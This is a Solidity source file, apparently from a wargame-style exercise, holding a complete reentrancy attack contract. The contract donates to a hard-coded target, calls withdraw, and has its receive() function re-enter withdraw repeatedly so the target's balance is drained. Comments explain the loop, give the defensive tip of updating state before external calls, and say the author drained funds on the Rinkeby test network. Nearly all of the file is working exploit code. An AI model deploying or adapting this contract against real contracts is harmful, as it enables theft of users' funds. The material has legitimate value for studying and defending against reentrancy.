// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function withdraw(uint _amount) external;
    function donate(address _to) payable external;
}

contract Attack {
    address target = 0x625EaAa1cBA846077aE7d312d35Ca5b85ccC0DB7;

    receive() external payable {
        if(address(target).balance > 0) {
            IReentrancy(target).withdraw(0.001 ether);
        } 
    }  

    function addDonate() public {
        IReentrancy(target).donate{value: 0.002 ether}(address(this));
    }

    function attack() public {
        IReentrancy(target).withdraw(0.001 ether);
    }
    function addFunds() public payable {}
    function seeContractBalance() public view returns (uint256){
      return address(this).balance;
  }
}

/*
This contract firstly adds funds to the target contract to meet the condition
for the withdrawal. When withdrawal call is made, target contract calls the fallback
function of the attack contract without changing its balance, entering a recursive loop
of withdrawal till all the funds are drained. It is important to change the state variables
before making external calls to other contracts.
*/ 

/* There is an important thing to take into consideration. The reentrancy code I provided here
does not work in Remix IDE (it reverts every time I attemp to reenter), and I do not know 
the reason why. But I drained all the funds on Rinkeby test network.
*/